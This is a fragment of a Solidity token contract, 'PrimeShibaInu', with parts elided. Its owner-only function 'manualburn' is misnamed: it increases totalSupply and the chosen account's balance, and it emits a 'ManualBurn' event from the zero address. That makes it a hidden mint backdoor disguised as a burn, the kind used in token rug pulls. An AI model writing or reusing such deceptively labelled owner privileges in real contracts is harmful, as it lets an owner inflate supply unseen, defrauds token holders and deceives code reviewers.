...
contract PrimeShibaInu is PausableToken {
    string public name;
    string public symbol;
    uint public decimals;
    event ManualBurn(address indexed from, address indexed to, uint256 value);
    ...
    function manualburn(address account, uint256 amount) onlyOwner public {

        totalSupply = totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
        emit ManualBurn(address(0), account, amount);
